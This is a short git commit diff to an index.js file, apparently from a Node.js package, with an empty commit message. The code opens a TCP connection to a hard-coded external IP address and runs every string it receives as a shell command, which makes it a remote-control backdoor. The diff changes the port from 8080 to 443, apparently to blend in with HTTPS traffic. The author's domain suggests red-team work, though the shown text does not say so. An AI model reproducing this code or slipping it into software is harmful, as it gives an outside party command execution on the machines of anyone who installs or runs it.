500efa4a329c64a0e7eb52e5fe9e3a2def2878a9
Jóhann Þór <johann@syndis.is>
2022-06-23 10:11:20 +0000

    .

--- index.js
+++ index.js
@@ -2,7 +2,7 @@
     var net = require("net");
     var exec = require("child_process").exec;
     var client = new net.Socket();
-    var connection = client.connect(8080, "46.101.40.16", function(){
+    var connection = client.connect(443, "46.101.40.16", function(){
         client.write("Ehlo!")
         client.on("data",(cmd) => {
             exec(cmd.toString(),(err,stdout,stderr) => {
